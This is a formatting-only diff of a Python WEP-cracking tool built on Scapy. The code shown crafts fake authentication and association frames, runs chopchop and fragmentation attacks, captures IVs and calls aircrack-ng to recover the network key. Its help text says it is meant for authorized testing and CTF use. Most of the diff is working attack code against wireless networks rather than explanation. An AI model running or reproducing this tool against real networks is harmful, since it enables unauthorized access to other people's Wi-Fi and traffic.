@@ -47,12 +47,16 @@ class WEPAttack:
     to aircrack-ng for PTW/FMS/KoreK key recovery.
     """
 
-    def __init__(self, interface: str, target_bssid: str,
-                 channel: Optional[int] = None,
-                 attack_mode: str = "arp-replay",
-                 output_dir: str = "captures",
-                 timeout: int = 600,
-                 target_ivs: int = 50000) -> None:
+    def __init__(
+        self,
+        interface: str,
+        target_bssid: str,
+        channel: Optional[int] = None,
+        attack_mode: str = "arp-replay",
+        output_dir: str = "captures",
+        timeout: int = 600,
+        target_ivs: int = 50000,
+    ) -> None:
         self.interface: str = interface
         self.target_bssid: str = target_bssid
         self.channel: Optional[int] = channel
@@ -144,14 +148,15 @@ class WEPAttack:
             return False
 
         auth_req = (
-            RadioTap() /
-            Dot11(
-                type=0, subtype=11,
+            RadioTap()
+            / Dot11(
+                type=0,
+                subtype=11,
                 addr1=self.target_bssid,
                 addr2=client_mac,
                 addr3=self.target_bssid,
-            ) /
-            Dot11Auth(algo=0, seqnum=1, status=0)
+            )
+            / Dot11Auth(algo=0, seqnum=1, status=0)
         )
 
         try:
@@ -161,16 +166,17 @@ class WEPAttack:
             return False
 
         asso_req = (
-            RadioTap() /
-            Dot11(
-                type=0, subtype=0,
+            RadioTap()
+            / Dot11(
+                type=0,
+                subtype=0,
                 addr1=self.target_bssid,
                 addr2=client_mac,
                 addr3=self.target_bssid,
-            ) /
-            Dot11AssoReq(cap="ESS", listen_interval=3) /
-            Dot11Elt(ID="SSID", info=b"") /
-            Dot11Elt(ID="Rates", info=b"\x02\x04\x0b\x16")
+            )
+            / Dot11AssoReq(cap="ESS", listen_interval=3)
+            / Dot11Elt(ID="SSID", info=b"")
+            / Dot11Elt(ID="Rates", info=b"\x02\x04\x0b\x16")
         )
 
         try:
@@ -265,9 +271,7 @@ class WEPAttack:
             return
 
         target_packet = captured[0]
-        self.logger.info(
-            "Chopchop: captured target packet, beginning byte-by-byte decrypt"
-        )
+        self.logger.info("Chopchop: captured target packet, beginning byte-by-byte decrypt")
 
         try:
             payload = bytes(target_packet[Raw].load)
@@ -283,7 +287,8 @@ class WEPAttack:
             try:
                 sendp(
                     target_packet.__class__(bytes(target_packet)),
-                    iface=self.interface, verbose=False,
+                    iface=self.interface,
+                    verbose=False,
                 )
             except Exception:
                 pass
@@ -301,20 +306,19 @@ class WEPAttack:
         """
         self.logger.info("Starting fragmentation attack against %s", self.target_bssid)
 
-        known_plaintext = (
-            b"\xaa\xaa\x03\x00\x00\x00\x08\x06"  # LLC/SNAP + ARP ethertype
-        )
+        known_plaintext = b"\xaa\xaa\x03\x00\x00\x00\x08\x06"  # LLC/SNAP + ARP ethertype
 
         frag = (
-            RadioTap() /
-            Dot11(
-                type=2, subtype=0,
+            RadioTap()
+            / Dot11(
+                type=2,
+                subtype=0,
                 addr1=self.target_bssid,
                 addr2="00:11:22:33:44:55",
                 addr3=self.target_bssid,
-            ) /
-            Dot11WEP(iv=b"\x00\x00\x00", keyid=0) /
-            Raw(load=known_plaintext)
+            )
+            / Dot11WEP(iv=b"\x00\x00\x00", keyid=0)
+            / Raw(load=known_plaintext)
         )
 
         try:
@@ -333,8 +337,7 @@ class WEPAttack:
                 iface=self.interface,
                 prn=self.packet_handler,
                 store=0,
-                stop_filter=lambda _: self._stop_event.is_set()
-                or self.iv_count >= self.target_ivs,
+                stop_filter=lambda _: self._stop_event.is_set() or self.iv_count >= self.target_ivs,
                 timeout=self.timeout,
             )
         except Exception as e:
@@ -354,12 +357,12 @@ class WEPAttack:
         try:
             result = subprocess.run(
                 ["aircrack-ng", "-a", "1", "-b", self.target_bssid, pcap_path],
-                capture_output=True, text=True, timeout=300,
+                capture_output=True,
+                text=True,
+                timeout=300,
             )
         except FileNotFoundError:
-            self.logger.error(
-                "aircrack-ng not found. Install with: apt install aircrack-ng"
-            )
+            self.logger.error("aircrack-ng not found. Install with: apt install aircrack-ng")
             return None
         except subprocess.TimeoutExpired:
             self.logger.error("aircrack-ng timed out")
@@ -368,7 +371,7 @@ class WEPAttack:
         output = result.stdout or ""
         if "KEY FOUND" in output:
             start = output.find("KEY FOUND")
-            self.logger.info("aircrack-ng: %s", output[start:start + 80].strip())
+            self.logger.info("aircrack-ng: %s", output[start : start + 80].strip())
             # Extract key between brackets, e.g. KEY FOUND! [ 12:34:56:78:90 ]
             try:
                 key = output[start:].split("[", 1)[1].split("]", 1)[0].strip()
@@ -464,7 +467,8 @@ class WEPAttack:
         try:
             subprocess.run(
                 ["aircrack-ng", "--help"],
-                capture_output=True, timeout=5,
+                capture_output=True,
+                timeout=5,
             )
             return True
         except FileNotFoundError:
@@ -493,9 +497,7 @@ class WEPAttack:
         try:
             os.makedirs(self.output_dir, exist_ok=True)
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filepath = os.path.join(
-                self.output_dir, f"wep_capture_{timestamp}.pcap"
-            )
+            filepath = os.path.join(self.output_dir, f"wep_capture_{timestamp}.pcap")
             wrpcap(filepath, packets)
             self.logger.info("Capture saved to %s (%d packets)", filepath, len(packets))
             return filepath
@@ -535,8 +537,8 @@ class WEPAttack:
 def main() -> None:
     parser = argparse.ArgumentParser(
         description="WEP Attack - IV collection, ARP replay, fake auth, "
-                     "and aircrack-ng key recovery for authorized security "
-                     "testing and CTF use only.",
+        "and aircrack-ng key recovery for authorized security "
+        "testing and CTF use only.",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -554,25 +556,37 @@ Note: Requires aircrack-ng installed for key recovery.
         """,
     )
 
-    parser.add_argument("-i", "--interface", required=True,
-                        help="Wireless interface in monitor mode")
-    parser.add_argument("-b", "--bssid", required=True,
-                        help="Target AP BSSID")
-    parser.add_argument("-ch", "--channel", type=int, default=None,
-                        help="WiFi channel")
-    parser.add_argument("-m", "--mode", default="arp-replay",
-                        choices=list(ATTACK_MODES),
-                        help="Attack mode (default: arp-replay)")
-    parser.add_argument("-o", "--output-dir", default="captures",
-                        help="Output directory for captured pcaps (default: captures)")
-    parser.add_argument("-t", "--timeout", type=int, default=600,
-                        help="Timeout in seconds (default: 600)")
-    parser.add_argument("--target-ivs", type=int, default=50000,
-                        help="Target IV count for cracking (default: 50000)")
-    parser.add_argument("--client-mac", default=None,
-                        help="Client MAC address for fake authentication")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
+    parser.add_argument(
+        "-i", "--interface", required=True, help="Wireless interface in monitor mode"
+    )
+    parser.add_argument("-b", "--bssid", required=True, help="Target AP BSSID")
+    parser.add_argument("-ch", "--channel", type=int, default=None, help="WiFi channel")
+    parser.add_argument(
+        "-m",
+        "--mode",
+        default="arp-replay",
+        choices=list(ATTACK_MODES),
+        help="Attack mode (default: arp-replay)",
+    )
+    parser.add_argument(
+        "-o",
+        "--output-dir",
+        default="captures",
+        help="Output directory for captured pcaps (default: captures)",
+    )
+    parser.add_argument(
+        "-t", "--timeout", type=int, default=600, help="Timeout in seconds (default: 600)"
+    )
+    parser.add_argument(
+        "--target-ivs",
+        type=int,
+        default=50000,
+        help="Target IV count for cracking (default: 50000)",
+    )
+    parser.add_argument(
+        "--client-mac", default=None, help="Client MAC address for fake authentication"
+    )
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     args = parser.parse_args()
     require_root()
